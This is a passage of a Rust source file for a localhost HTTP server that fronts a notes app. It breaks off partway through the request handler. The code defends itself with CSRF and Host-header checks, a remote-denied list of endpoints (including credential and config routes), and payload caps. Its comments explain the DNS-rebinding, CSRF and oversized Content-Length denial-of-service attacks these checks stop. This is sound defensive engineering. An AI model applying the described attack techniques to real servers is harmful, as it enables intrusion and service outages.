//! `fm-serve` — the browser frontend's transport. It exposes `fm_app::dispatch` (the one
//! command surface, over one shared set of vaults) as a tiny localhost HTTP+JSON API, and
//! serves the built UI. The frontend's `ipc.ts` calls `POST /api/<command>` with camelCase
//! args, so the identical bundle runs in a browser against the REAL vault.
//!
//! **This file is a shell, and that is the whole point.** Everything here is HTTP: parsing
//! a request line, the CSRF guard, status codes, `Range` headers, serving static assets.
//! The commands themselves — and the vault list, and the lock discipline — live in
//! `fm_app::dispatch`, so a second frontend reaches them by calling that function rather
//! than by re-implementing this file. When this file starts knowing what a command *means*,
//! the fork has begun again.
//!
//! Localhost only, one machine. std-only networking, thread-per-connection. **Not** "single
//! user" in the trust sense any more: note bodies arrive from collaborators through the `.md`
//! merge driver, so the read view treats them as untrusted and sanitizes before rendering
//! (`ui/src/lib/render.ts`). The CSRF guard still allows no-Origin requests (curl/scripts have
//! no ambient credentials to abuse), which is exactly why that sanitizer is load-bearing.

// The built UI, baked in at compile time by build.rs — this is what makes the core one
// self-contained file rather than a binary that needs its assets shipped beside it.
include!(concat!(env!("OUT_DIR"), "/ui_assets.rs"));

#[cfg(feature = "agent")]
mod agent;
#[cfg(feature = "agent")]
mod agent_registry;
mod blob;
mod share;
#[cfg(feature = "tls")]
mod tls;

use fm_app::{dispatch_as, App, Host, Output, Scope};
use serde_json::Value;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

struct AppState {
    /// The command surface. Everything vault-shaped lives in here now.
    app: App,
    /// Where to read the UI from, or `None` to serve the copy baked into this binary.
    ///
    /// `Some` only when `FM_UI_DIST` is set explicitly, which is the dev loop: `pixi run
    /// serve` points it at `ui/dist` so editing a `.svelte` and reloading shows the change
    /// with no Rust rebuild. Unset — every release launch — serves the embedded assets, so
    /// the binary needs nothing beside it.
    dist: Option<PathBuf>,
    /// The origins our own page can be served from. Any other origin on an API
    /// call is some site the user merely visited, reaching for their vault.
    origins: Vec<String>,
    /// When the last request arrived — the browser's heartbeat refreshes it, so
    /// the auto-shutdown watchdog can tell an open tab from a closed one.
    last_seen: Mutex<Instant>,
    /// Set once the first request lands, so we grant a longer grace for a cold
    /// browser to make contact before the idle timeout applies.
    connected: AtomicBool,
    /// All the study-agent state — registry, spawn flag, watched port — in one field behind the
    /// `agent` feature. Without the feature this field (and every route that reads it) is gone, so the
    /// core is provably agent-free. Its own module keeps the command core agnostic even *with* it.
    #[cfg(feature = "agent")]
    agent: agent::AgentState,
    /// Pairing codes, device tokens, and what the listener actually managed to do. See
    /// [`share`] — in particular why the *setting* and the *capability* are separate fields.
    share: share::ShareState,
}

impl AppState {
    /// The one constructor. Everything but `(app, dist, origins, port)` is a fixed initial state, so
    /// the three call sites (serve, and two test harnesses) can't drift in what they default. `port`
    /// is only the agent's (it watches this port); without that feature it is unused.
    fn new(app: App, dist: Option<PathBuf>, origins: Vec<String>, port: u16) -> Self {
        #[cfg(not(feature = "agent"))]
        let _ = port;
        AppState {
            app,
            dist,
            origins,
            last_seen: Mutex::new(Instant::now()),
            connected: AtomicBool::new(false),
            #[cfg(feature = "agent")]
            agent: agent::AgentState::new(port),
            share: share::ShareState::load(),
        }
    }
}

/// This platform's answer to "open this file with whatever owns it" — the one thing
/// `fm_app::dispatch` cannot know for itself. See [`fm_app::Host`].
struct Desktop;

impl Host for Desktop {
    fn open_external(&self, path: &Path) -> Result<(), String> {
        open_native(path.as_os_str()).map_err(|e| format!("could not open the file: {e}"))
    }
}

fn main() {
    // Absent on purpose: no default path. The UI is *in* the binary unless someone
    // explicitly points us at a directory.
    let dist = std::env::var_os("FM_UI_DIST").map(PathBuf::from);
    let addr = std::env::var("FM_ADDR").unwrap_or_else(|_| "127.0.0.1:8765".to_string());

    // Both spellings of "us": a browser sends whichever hostname the user typed.
    let port = addr.rsplit(':').next().unwrap_or("8765").to_string();
    let origins =
        vec![format!("http://127.0.0.1:{port}"), format!("http://localhost:{port}")];

    let (app, skipped) = App::load().expect("open vaults");
    let configs = app.configs().expect("vaults");
    if configs.is_empty() {
        // Not an error, and not a fallback to a vault nobody chose: the first run. The UI
        // gates on `list_vaults` returning `[]` and asks for one.
        eprintln!("no vaults configured — open the app to create your first one.");
    }
    // A vault opens even when a note is unreadable — a conflicted merge is the usual
    // cause, and refusing to start would take away the very app you need to fix it. But
    // those notes are now absent from every view, so say which ones: silently serving an
    // incomplete vault is the one outcome worse than not starting at all.
    if !skipped.is_empty() {
        eprintln!("warning: {} note(s) could not be read and are missing from every view:", skipped.len());
        for note in &skipped {
            eprintln!("  {note}");
        }
        eprintln!("  (a conflicted merge? resolve the markers and reload.)");
    }
    let state = Arc::new(AppState::new(app, dist, origins, port.parse().unwrap_or(8765)));

    match &state.dist {
        // Told to read from disk, but there is nothing there.
        Some(d) if !d.join("index.html").exists() => eprintln!(
            "warning: FM_UI_DIST={} has no index.html — build the UI first (pnpm -C ui build)",
            d.display()
        ),
        // Serving ourselves, but nothing was baked in (built before `pnpm build` ran).
        None if UI_ASSETS.is_empty() => eprintln!(
            "warning: no UI is embedded in this binary — rebuild with `pixi run build`, \
             or set FM_UI_DIST to a built ui/dist"
        ),
        _ => {}
    }

    // **This machine's own listener, unchanged and unconditional.** Plain HTTP on loopback: the
    // desktop's browser, `fm-cli`, curl and the study agent all arrive here, and none of them
    // learns that sharing exists. Sharing gets its *own* socket below rather than widening this
    // one, because TLS is a property of a socket and because a bug in the sharing path then
    // cannot reach a listener that was never exposed.
    // **A busy port is not a crash.** This used to `panic!`, which on Windows means a
    // double-clicked console window flashes and vanishes with nothing readable in it — and a busy
    // port is the *normal* second launch, because the app that owns 8765 is almost always our own
    // earlier instance. So the two cases are told apart and answered differently: ours is not an
    // error at all, and anything else cannot be fixed by opening a browser. The sharing listener
    // below already refuses gracefully; this is the same courtesy on the path everybody takes.
    let listener = match TcpListener::bind(&addr) {
        Ok(l) => l,
        Err(e) if e.kind() == std::io::ErrorKind::AddrInUse => {
            if serving_formicaria(&addr) {
                println!("formicaria is already running — open http://{addr} in your browser");
                // Only when asked, so a terminal launch stays quiet; the launcher sets FM_OPEN,
                // so the double-click case lands the user in the running app, which is what they
                // were trying to do.
                if env_flag("FM_OPEN", true) {
                    let _ = open_native(std::ffi::OsStr::new(&format!("http://{addr}")));
                }
                return;
            }
            eprintln!("Something else on this machine is already using {addr},");
            eprintln!("so formicaria cannot start. Close it, or pick another port:");
            eprintln!("    FM_ADDR=127.0.0.1:8788");
            std::process::exit(1);
        }
        Err(e) => {
            eprintln!("formicaria could not listen on {addr}: {e}");
            std::process::exit(1);
        }
    };
    for v in &configs {
        println!("formicaria is serving {} at {}", v.name, v.path.display());
    }
    if env_flag("FM_OPEN", true) {
        println!("formicaria is opening in your browser:  http://{addr}");
    } else {
        println!("open  http://{addr}  in your browser");
    }
    // **Only Windows gets this line, and only Windows needs it.** Double-clicking an .exe there
    // creates a console that belongs to the program, so closing it kills the server — and that
    // window is showing an address which invites exactly that: copy it out, then tidy the black
    // window away. On macOS and Linux a bare launch happens from a terminal the user already owned.
    #[cfg(windows)]
    println!("\nKeep this window open while you work. Closing it stops formicaria.");

    if state.share.enabled() {
        spawn_shared_listener(Arc::clone(&state), &port);
    }

    // **On by default.** A double-click — of the launcher or of the binary itself — should land
    // the user in the app, not in front of an address to copy out by hand.
    //
    // **No delay here, and there never needed to be one.** This slept 400ms first, to "let the
    // listener accept before the browser's first request" — but `TcpListener::bind` above also
    // calls `listen()`, so the kernel has been queueing connections since that line. A request
    // arriving before `accept()` runs waits in the backlog; it cannot be refused. The accept loop
    // starts a few lines below, microseconds away. So the sleep guarded against nothing and cost
    // 400ms of every single launch — measured while looking for exactly this kind of leftover.
    if env_flag("FM_OPEN", true) {
        let url = format!("http://{addr}");
        std::thread::spawn(move || {
            let _ = open_native(std::ffi::OsStr::new(&url));
        });
    }

    // **On by default too**, so closing the browser tab closes the app and nothing is left running
    // behind it. The dev loop opts out (`pixi run serve` sets it to 0): there a closed tab means
    // "I am about to reload", not "I am finished".
    if env_flag("FM_AUTO_SHUTDOWN", true) {
        spawn_watchdog(Arc::clone(&state));
    }

    // **Auto-start the local study agent, if it is enabled** (a per-device opt-in). fm-serve just
    // runs an *opt-in script in `agents/`* — the shared command core (`fm_app`/`dispatch`) never
    // learns the agent exists, and with no `agents/` directory nothing is spawned (pure formicaria).
    // The agent dies with formicaria: it watches this very port and stops the model when we stop
    // answering, so a closed app leaves nothing running.
    #[cfg(feature = "agent")]
    agent::spawn_at_launch(Arc::clone(&state));

    for mut stream in listener.incoming().flatten() {
        let state = Arc::clone(&state);
        // **Who is on the other end is a property of the connection, not of the request.** Read
        // it here, once, rather than letting `handle` ask: a peer address cannot be spoofed by a
        // header, and taking it at accept time means there is exactly one place the answer comes
        // from. A peer we cannot identify is treated as remote — the safe direction.
        let peer = Peer { loopback: stream.peer_addr().is_ok_and(|a| a.ip().is_loopback()), tls: false };
        // **A read deadline, which this server has never had.** It is thread-per-connection, so a
        // peer that opens a socket and sends half a header line pins a thread forever; a few
        // dozen of those and nothing else is served. That was survivable while only this machine
        // could connect and is not once the port is on a network.
        let _ = stream.set_read_timeout(Some(Duration::from_secs(30)));
        let _ = stream.set_write_timeout(Some(Duration::from_secs(60)));
        std::thread::spawn(move || {
            if let Err(e) = handle(&mut stream, peer, &state) {
                eprintln!("connection error: {e}");
            }
        });
    }
}

/// Commands a paired device may not run, whatever vaults it was given.
///
/// **This is not about audiences** — that is [`Scope`]'s job and it is enforced in
/// `dispatch`. These are refused because the command acts on *the host*, so "which vault" is not
/// the question it asks. A tablet pressing them would either do something invisible to the person
/// holding it, or hand a remote caller a capability over the machine.
///
/// Matched on **path**, and checked in [`authorize`] above every route, because the agent routes
/// are dispatched before `api()` ever sees a command name — `/api/set_agent` runs
/// `Command::new("bash")` and starts a multi-GB model on the desktop's GPU, and it persists, so
/// it would come back at every launch.
const REMOTE_DENIED: &[&str] = &[
    // Spawns a process, or writes host-level state.
    "/api/set_agent",
    "/api/set_transcribe",
    "/api/agent_activity",
    "/api/agent_present",
    "/api/backup",
    "/api/open_external",
    "/api/open_skipped",
    "/api/set_git_credential",
    "/api/clear_git_credential",
    // `set_identity` runs `ensure_repo` and names the committer for every future commit in the
    // host's vault. A paired tablet is a guest; it does not get to say who this machine is.
    "/api/set_identity",
    // Hands caller-supplied text to `git`, or probes the host's filesystem. `check_path` reports
    // existence and writability for an arbitrary path — a filesystem oracle over the whole
    // machine, and its only legitimate caller (`create_vault`) is denied anyway.
    "/api/probe_remote",
    "/api/check_path",
    "/api/git_auth",
    // Granting permission to publish this vault's review record relicenses shared content, and
    // publication cannot be recalled. A guest device does not get to answer that for the host.
    "/api/set_supervision",
    // Vault lifecycle, and policy with off-machine effects. `set_git_assets_max` changes what
    // every git collaborator receives, from a device that is a guest in one vault.
    "/api/create_vault",
    "/api/clone_vault",
    "/api/restore_vault",
    "/api/set_git_remote",
    "/api/set_git_assets_max",
    // Discloses the host: every vault's absolute path, the vault-list path, and the value of
    // `FM_RESTIC_REPO`, which can be an `s3:`/`rest:` URL carrying an access key.
    "/api/config",
    // Irreversible, and unguarded by design — `delete` takes no `base` and does no version
    // check. Its safety net is weaker than it looks, too: `commit_all` refuses during a
    // conflicted merge and reports that with the same `false` it uses for "nothing to do", so in
    // exactly the situation two live writers create, the auto-commit can be quietly frozen.
    "/api/delete",
];

/// Why a request is being turned away, and what to say.
struct Refused(&'static str, &'static [u8]);

impl Refused {
    fn write(self, conn: &mut dyn Conn) -> std::io::Result<()> {
        write_response(conn, self.0, "text/plain", self.1)
    }
}

/// Decide what this caller may reach, or refuse it.
///
/// Loopback is unchanged and unconditional: this machine's own browser, `fm-cli`, curl and the
/// study agent all get [`Scope::All`], exactly as before sharing existed.
fn authorize(
    peer: Peer,
    path: &str,
    cookie: Option<&str>,
    state: &AppState,
) -> Result<Scope, Refused> {
    if peer.loopback {
        return Ok(Scope::All);
    }
    if !state.share.enabled() {
        return Err(Refused("403 Forbidden", b"this vault is not shared"));
    }
    // The one unauthenticated API route — it is how a device gets a token in the first place.
    // Rate-limited inside `share::pair` by cancelling the code after a few wrong guesses.
    if path == "/api/pair" {
        return Ok(Scope::Only(Vec::new()));
    }
    // Static assets are served unauthenticated, or the tablet could never load the very page
    // that contains the pairing screen. What that discloses is the UI bundle, which is public
    // source — no vault content is reachable without a token.
    if !path.starts_with("/api/") {
        return Ok(Scope::Only(Vec::new()));
    }

    let token = cookie.and_then(cookie_value);
    let scope = token
        .as_deref()
        .and_then(|t| share::scope_for(state, t))
        .ok_or(Refused("401 Unauthorized", b"pair this device first"))?;

    // Authorization, at the same point as authentication and above every route.
    if REMOTE_DENIED.contains(&path) {
        return Err(Refused("403 Forbidden", b"that action can only be done on the computer"));
    }
    Ok(scope)
}

/// Pull our token out of a `Cookie:` header, which may carry other cookies too.
fn cookie_value(header: &str) -> Option<String> {
    header
        .split(';')
        .filter_map(|kv| kv.split_once('='))
        .find(|(k, _)| k.trim() == SHARE_COOKIE)
        .map(|(_, v)| v.trim().to_string())
}

/// The cookie a paired device carries.
///
/// **A cookie rather than a header, and this is forced rather than chosen.** Blob URLs are used
/// as `<img src>`/`<video src>` (`ipc.ts`'s `assetUrl`), and a subresource load cannot carry a
/// custom header — so the alternative is a `?token=` query parameter, which puts the credential
/// in the DOM, in the referrer, and in any log. `HttpOnly` additionally means a bypass of the
/// note sanitiser cannot read it, which matters because note bodies arrive from collaborators.
const SHARE_COOKIE: &str = "fm_share";

/// Is this `Origin` one of ours?
///
/// For loopback, the two spellings of localhost, as before. For a remote peer, any origin whose
/// host is the IP literal or `.local` name the Host gate already accepted — the two checks have
/// to agree or a browser that passed one would fail the other.
fn allowed_origin(origin: &str, peer: Peer, state: &AppState) -> bool {
    if peer.loopback {
        return state.origins.iter().any(|a| a == origin);
    }
    let bare = origin.strip_prefix("http://").or_else(|| origin.strip_prefix("https://"));
    let Some(rest) = bare else { return false };
    let hostname = match rest.strip_prefix('[') {
        Some(r) => r.split(']').next().unwrap_or(""),
        None => rest.split(':').next().unwrap_or(""),
    };
    hostname.parse::<std::net::IpAddr>().is_ok() || hostname.ends_with(".local")
}

/// The listener paired devices reach, on its own port and its own thread.
///
/// **A failure here must not take the app down.** The notebook working on this computer matters
/// more than the tablet doing so — but the failure has to be *stated*, or the tablet simply never
/// connects and nothing ever says why. That is what the `Err` arm of `share.bound` carries, and
/// it is what the Settings line reads.
fn spawn_shared_listener(state: Arc<AppState>, port: &str) {
    // Its own port because it must coexist with the loopback listener above, which already holds
    // `port` on `127.0.0.1`.
    let share_port: u16 = port.parse::<u16>().unwrap_or(8765).saturating_add(1);
    let addr = format!("0.0.0.0:{share_port}");

    let fail = |state: &AppState, why: String| {
        eprintln!("share: {why}");
        if let Ok(mut b) = state.share.bound.lock() {
            *b = Err(why);
        }
    };

    // TLS if it was compiled in, plain HTTP if not. **The plain path is a real, supported
    // degradation, not a silent one**: everything about sharing works over it except an in-app
    // microphone, which needs a secure context. `--no-default-features` is how you get here.
    #[cfg(feature = "tls")]
    let tls = match tls::load_or_mint() {
        Ok(t) => Some(t),
        Err(e) => {
            fail(&state, format!("could not prepare a certificate ({e}) — not sharing"));
            return;
        }
    };
    #[cfg(not(feature = "tls"))]
    let tls: Option<()> = None;

    let listener = match TcpListener::bind(&addr) {
        Ok(l) => l,
        Err(e) => return fail(&state, format!("could not listen on {addr}: {e}")),
    };

    let scheme = if tls.is_some() { "https" } else { "http" };
    let host = share::reachable_host();
    let url = format!("{scheme}://{host}:{share_port}");
    println!("share: listening for paired devices at {url}");

    #[cfg(feature = "tls")]
    if let Some(t) = &tls {
        // Shown so it can be compared against what the device displays **before** installing.
        // That comparison is the only verification available on a home network, and it is the
        // reason no click-through path is offered.
        println!("share: certificate fingerprint  {}", t.fingerprint);
        println!("share: install this on the device: {}", t.cert_path.display());
        if let Ok(mut f) = state.share.cert.lock() {
            *f = Some((t.fingerprint.clone(), t.cert_path.display().to_string()));
        }
    }

    if let Ok(mut b) = state.share.bound.lock() {
        *b = Ok(Some(url));
    }

    #[cfg(feature = "tls")]
    let tls_config = tls.map(|t| t.config);

    std::thread::spawn(move || {
        for mut stream in listener.incoming().flatten() {
            let state = Arc::clone(&state);
            // Never loopback by construction — but read rather than assumed, because a machine
            // *can* reach its own `0.0.0.0` socket over 127.0.0.1, and that connection is the
            // desktop's own browser rather than a guest.
            let loopback = stream.peer_addr().is_ok_and(|a| a.ip().is_loopback());
            let _ = stream.set_read_timeout(Some(Duration::from_secs(30)));
            let _ = stream.set_write_timeout(Some(Duration::from_secs(60)));
            #[cfg(feature = "tls")]
            let cfg = tls_config.clone();
            std::thread::spawn(move || {
                #[cfg(feature = "tls")]
                if let Some(cfg) = cfg {
                    let peer = Peer { loopback, tls: true };
                    match rustls::ServerConnection::new(cfg) {
                        Ok(conn) => {
                            let mut s = rustls::StreamOwned::new(conn, stream);
                            // A handshake failure is ordinary: it is what a device that has not
                            // trusted the certificate produces, and it is not our error to report.
                            if let Err(e) = handle(&mut s, peer, &state) {
                                eprintln!("share: connection error: {e}");
                            }
                        }
                        Err(e) => eprintln!("share: tls session: {e}"),
                    }
                    return;
                }
                let peer = Peer { loopback, tls: false };
                if let Err(e) = handle(&mut stream, peer, &state) {
                    eprintln!("share: connection error: {e}");
                }
            });
        }
    });
}

/// A connection, whatever it is made of.
///
/// Object-safe and taken as `&mut dyn Conn`, rather than making every function generic. Two
/// reasons, and the second is the real one:
///
/// - `write_response` has a dozen call sites across four modules; generics would infect all of
///   them and both test harnesses.
/// - Monomorphising would produce **two copies of `handle`** — one per stream type — which is the
///   "the plain path is the tested one and the TLS path is the one that matters" hazard, enforced
///   by the compiler. One function, one policy, is the whole design here.
///
/// The cost is one vtable hop per `write_all`. `blob.rs` streams in 64 KiB chunks, so that is one
/// dynamic call per chunk against a `read` and a `write` syscall — unmeasurable.
pub(crate) trait Conn: Read + Write {}
impl<T: Read + Write + ?Sized> Conn for T {}

/// What we know about the other end of the socket before reading a byte of the request.
#[derive(Clone, Copy, Debug)]
struct Peer {
    /// Whether this connection is encrypted — which decides whether the device's cookie may
    /// carry `Secure`, and therefore whether it may be persistent at all. A bearer token sent in
    /// clear over a network is the shape `decisions.md` (Android TLS) rejects outright.
    tls: bool,
    /// This machine talking to itself: the desktop's own browser, `fm-cli`, curl, and the study
    /// agent (which connects to `127.0.0.1` and sends no `Origin` — see `fm-agent-run`'s
    /// `fmserve.rs`). Everything that existed before sharing is loopback, which is why loopback
    /// keeps exactly its old behaviour and nothing has to be re-tested against a new gate.
    loopback: bool,
}

/// Auto-shutdown: exit the process when no browser tab is talking to us anymore.
/// The UI sends a heartbeat (`POST /api/alive`) every 15 s; when the last
/// tab closes the heartbeats stop and, after an idle window, we quit — so
/// closing the tab closes the app. The idle window is longer than a page reload
/// (which briefly pauses the heartbeat), so a refresh doesn't kill the server.
/// Before the very first request a longer grace covers a cold browser start.
fn spawn_watchdog(state: Arc<AppState>) {
    // **Sized against a *throttled* beat, not a nominal one.** Browsers throttle timers in a
    // backgrounded tab to roughly once a minute, so the old pairing — a 3 s beat against a
    // 10 s window — meant leaving the app in a background tab for a minute killed it while
    // the user still had it open. The window has to exceed the worst-case throttle with
    // room to spare, which is what 90 s buys against the 15 s nominal beat.
    //
    // Erring long leaves a server running ~90 s after the last tab closes. Erring short
    // kills the app under someone who is working in it. The costs are not symmetric, so
    // this is biased toward the recoverable failure.
    const IDLE: Duration = Duration::from_secs(90);
    const STARTUP: Duration = Duration::from_secs(60);
    std::thread::spawn(move || loop {
        std::thread::sleep(Duration::from_secs(2));
        let idle = state.last_seen.lock().map(|t| t.elapsed()).unwrap_or_default();
        let limit = if state.connected.load(Ordering::Relaxed) { IDLE } else { STARTUP };
        if idle > limit {
            std::process::exit(0);
        }
    });
}

fn handle(conn: &mut dyn Conn, peer: Peer, state: &AppState) -> std::io::Result<()> {
    // **One stream, read through a buffer, written through the same handle.**
    //
    // This used to `try_clone()` the socket so it could hold a `BufReader` and still write to the
    // original. That is a `TcpStream`-only trick — a TLS session is a single stateful object and
    // cannot be duplicated — and it was never needed: the body is fully read before anything is
    // written (the ordering the 413 branch already relied on), so the reader can simply hand the
    // stream back with `get_mut()` when it is time to reply. One fewer `dup()` per connection.
    let mut reader = BufReader::new(conn);

    let mut request_line = String::new();
    if reader.read_line(&mut request_line)? == 0 {
        return Ok(()); // client closed
    }
    let mut parts = request_line.split_whitespace();
    let method = parts.next().unwrap_or("").to_string();
    let path = parts.next().unwrap_or("/").to_string();

    // Liveness for the auto-shutdown watchdog. **Moved below the gate** — see `keep_alive` — so
    // that an unauthenticated stranger cannot hold the app open, while a *paired* device can:
    // the watchdog's question is "is anyone using this?", not "is the desktop using this?".

    // Read headers; we care about the body length, who is calling, and the byte range a
    // media element is asking for.
    let mut content_length = 0usize;
    let mut origin: Option<String> = None;
    let mut range: Option<String> = None;
    let mut host: Option<String> = None;
    let mut cookie: Option<String> = None;
    let mut agent_client = false;
    loop {
        let mut line = String::new();
        if reader.read_line(&mut line)? == 0 {
            break;
        }
        let line = line.trim_end();
        if line.is_empty() {
            break; // end of headers
        }
        let lower = line.to_ascii_lowercase();
        if let Some(v) = lower.strip_prefix("content-length:") {
            content_length = v.trim().parse().unwrap_or(0);
        } else if let Some(v) = lower.strip_prefix("origin:") {
            // Lowercased with the rest of the line, which is harmless: an origin is
            // scheme + host + port, none of which are case-sensitive.
            origin = Some(v.trim().to_string());
        } else if let Some(v) = lower.strip_prefix("range:") {
            range = Some(v.trim().to_string());
        } else if let Some(v) = lower.strip_prefix("host:") {
            host = Some(v.trim().to_string());
        } else if lower.starts_with("cookie:") {
            // **From the un-lowercased line**: a token is base16 and survives lowercasing today,
            // but reading a credential out of a string we have deliberately mangled is how that
            // stops being true the day the token format changes.
            cookie = line.split_once(':').map(|(_, v)| v.trim().to_string());
        } else if let Some(v) = lower.strip_prefix("x-formicaria-agent:") {
            // "I am the assistant, not a person." Read here, acted on at the liveness refresh
            // below; it changes nothing else about how the request is treated.
            agent_client = v.trim() == "1";
        }
    }
    // **The cap is on the declared length; the allocation must not be.**
    //
    // This used to check the ceiling and then `vec![0u8; content_length]` — allocating whatever
    // the *header* claimed, before reading a byte. A peer that sends `Content-Length: 536870911`
    // and then nothing costs half a gigabyte of resident memory per connection, and this server
    // is thread-per-connection: fifty sockets, no payload, ~25 GB. Harmless while only this
    // machine could open one; a two-line denial of service once the port is on a network.
    //
    // So: a much lower ceiling for anyone who is not this machine (the UI's own ingest limit is
    // 48 MB, so this is not a restriction anybody meets), and the buffer grows as bytes actually
    // arrive rather than being sized from a promise.
    let ceiling = if peer.loopback { 512 * 1024 * 1024 } else { 64 * 1024 * 1024 };
    if content_length > ceiling {
        return write_response(reader.get_mut(), "413 Payload Too Large", "text/plain", b"payload too large");
    }
    let mut body = Vec::new();
    if content_length > 0 {
        // `take` bounds it a second time, so a lying `Content-Length` cannot read past what we
        // agreed to accept even if the header and the stream disagree.
        std::io::Read::take(&mut reader, content_length as u64).read_to_end(&mut body)?;
        if body.len() != content_length {
            return write_response(reader.get_mut(), "400 Bad Request", "text/plain", b"short body");
        }
    }

    // **DNS rebinding.** Binding to 127.0.0.1 keeps other *machines* out, but it does not
    // decide which *name* a browser used to get here: a hostname an attacker controls, made
    // to resolve to 127.0.0.1, reaches this server from a page that is same-origin with
    // itself — so the CSRF guard below sees a matching Origin and waves it through, and the
    // browser lets that page read every response.
    //
    // The fix is to insist on the names we actually serve. Anything else is a request that
    // arrived under a name we never published, which is the attack and nothing else.
    // A missing Host is HTTP/1.0 or a hand-rolled client — not a browser, so not this
    // vector, and refusing it would break curl for no gain.
    if let Some(h) = &host {
        // An IPv6 literal is bracketed (`[::1]:8765`), so the port cannot simply be split off
        // at the first colon — that yields `[` and refuses a request from ourselves.
        let bare = match h.strip_prefix('[') {
            Some(rest) => rest.split(']').next().unwrap_or(""),
            None => h.split(':').next().unwrap_or(""),
        };
        //
        // **A shared listener does not relax this — it changes what the published names are.**
        // The reasoning above gets *stronger* when the port is on a network, because now any
        // page any device on that network visits can reach us. A remote request must therefore
        // arrive under a bare IP literal (which has no DNS to rebind — that is the whole point)
        // or a `.local` mDNS name. Anything else is a name we never published.
        let expected: bool = if peer.loopback {
            matches!(bare, "127.0.0.1" | "localhost" | "::1")
        } else {
            bare.parse::<std::net::IpAddr>().is_ok() || bare.ends_with(".local")
        };
        if !expected {
            return write_response(
                reader.get_mut(),
                "403 Forbidden",
                "text/plain",
                b"unexpected Host header",
            );
        }
    }

    // ---- Who is calling, and what may they reach? ------------------------------------------
    //
    // **One point, above every route.** Sited here — after the Host gate, before everything else
    // — because below this line lie the blob route, `/api/alive`, the agent routes, the command
    // dispatch and the static files, and each of them would otherwise need to remember. An
    // earlier draft of this put authentication here and *authorization* inside `api()`, which
    // sits below the agent routes: `/api/set_agent` would have escaped it entirely, and that
    // route runs `Command::new("bash")`.
    let scope = match authorize(peer, &path, cookie.as_deref(), state) {
        Ok(s) => s,
        Err(refusal) => return refusal.write(reader.get_mut()),
    };

    // Liveness for the auto-shutdown watchdog, now that we know the caller is entitled to be
    // here. **Any authenticated peer counts, not just loopback.** The alternative — only this
    // machine keeps the app alive — kills the server out from under someone actively working on
    // a paired tablet, which is the whole use case; and `FM_AUTO_SHUTDOWN` is set by the desktop
    // launcher, i.e. the owner's normal way of starting it, so that failure would be the common
    // path rather than an edge case. A tablet left face-up is handled where it belongs: the UI
    // stops beating when the page is hidden.
    //
    // **Any authenticated *person*, that is — and the assistant is not one.** It is a child of
    // this process: it watches this port, and it stops itself when we stop answering. But it also
    // polls the vault every 1–5 s for as long as it runs, and every one of those polls landed
    // here, so the 90-second idle window could never close while it was on: the app held itself
    // open by asking whether it was open, and `fm-serve` plus a multi-GB `llama-server` stayed
    // resident until the machine was rebooted. So a request that says it is the assistant is
    // served exactly as before and simply does not count as somebody being here.
    //
    // The header needs no secrecy, because the only thing sending it can do is give up your own
    // claim on keeping the app open — which any client can already do by staying quiet.
    if !agent_client {
        if let Ok(mut t) = state.last_seen.lock() {
            *t = Instant::now();
        }
        state.connected.store(true, Ordering::Relaxed);
    }
    if !peer.loopback {
        if let Ok(mut t) = state.share.last_remote.lock() {
            *t = Some(Instant::now());
        }
    }

    // The vault is reachable at a fixed localhost port with no authentication, so
    // any page the user happens to visit could POST to it — and a `text/plain`
    // body skips the CORS preflight, so the browser hides the *response* while the
    // side effect (a delete, a write) still lands. Browsers send `Origin` on every
    // POST, same-origin included, so a mismatch is exactly that attack.
    //
    // No `Origin` at all means a non-browser client — curl, a script, a test.
    // That is not a CSRF vector (there are no ambient credentials to abuse) and
    // refusing it would break every command-line workflow, so it passes.
    //
    // **That last paragraph is true only of loopback, and it stopped being a safe default the
    // moment a cookie existed.** "No ambient credentials to abuse" was the load-bearing clause,
    // and a paired device carries exactly that: a browser attaches its cookie to a request from
    // any page it happens to load. `SameSite` blocks the obvious version at the browser, but a
    // security property we can check ourselves should not be delegated to one. So a remote peer
    // gets **no carve-out**: a browser always sends `Origin` on a POST, and a remote caller that
    // does not send one is not a browser and has no business writing to a vault.
    //
    // Loopback keeps the carve-out untouched, which is why `fm-cli`, curl and the study agent
    // (`fm-agent-run` sends no `Origin` — that is exactly why it passes today) need no changes.
    if method == "POST" && path.starts_with("/api/") {
        match &origin {
            Some(o) if !allowed_origin(o, peer, state) => {
                return write_response(
                    reader.get_mut(),
                    "403 Forbidden",
                    "text/plain",
                    b"cross-origin request refused",
                );
            }
            None if !peer.loopback => {
                return write_response(
                    reader.get_mut(),
                    "403 Forbidden",
                    "text/plain",
                    b"a remote request must state its origin",
                );
            }
            _ => {}
        }
    }

    // Blob bytes are the one response we refuse to build in memory: a video is served by
    // `<video src>`, which range-requests as the user seeks, and buffering 300 MB per seek
    // is how the old object-URL path behaved. Streamed from disk, so it costs one buffer.
    if (method == "GET" || method == "HEAD") && path.starts_with("/api/blob/") {
        let hash = path[10..].split('?').next().unwrap_or("");
        // **Scoped, and it has to be passed in.** This route is deliberately not a command, so
        // it never reaches `dispatch`'s enforcement. Blobs are content-addressed and
        // deduplicated, so a hash a paired device legitimately learns from its own vault would
        // otherwise resolve against a private one — same bytes, same answer, wrong audience.
        return blob::serve(reader.get_mut(), state, &scope, hash, range.as_deref(), method == "HEAD");
    }

    // Liveness, and *only* liveness — the cheapest possible "a tab is still here".
    //
    // Deliberately not a command. `last_seen` was already refreshed above, before routing,
    // so answering is all that is left to do: no lock, no filesystem, no dispatch. That
    // matters because the tab has to say this on a timer forever, and the alternative —
    // riding `ping`, which reindexes — meant every heartbeat took the vault lock and could
    // queue behind a `backup_status` doing a network `ls-remote` per vault.
    //
    // It is also transport-shaped, not app-shaped: the auto-shutdown watchdog is a property
    // of *this* server, and a frontend with no watchdog would never call it. Putting it in
    // `dispatch` would push a transport concern into the shared surface.
    // It now also **carries the share capability back**, which is why the body stopped being
    // empty. That report has to reach the UI on a timer (a listener can fail, and a network can
    // stop carrying packets, long after the settings screen was last open), and this is already
    // the transport's own beat — `ping` belongs to `dispatch`, which knows nothing about
    // sharing, and inventing a third timer for it would be a third thing to keep in step.
    // The manual. Above the static-file arm because it must not inherit the SPA fallback, and
    // routed here rather than in `static_file` because it writes its own CSP — see `manual`.
    if (method == "GET" || method == "HEAD") && (path == "/manual" || path.starts_with("/manual/"))
    {
        return manual(reader.get_mut(), &path);
    }

    if path == "/api/alive" {
        let body = share::status_json(state).to_string();
        return write_response(reader.get_mut(), "200 OK", "application/json", body.as_bytes());
    }

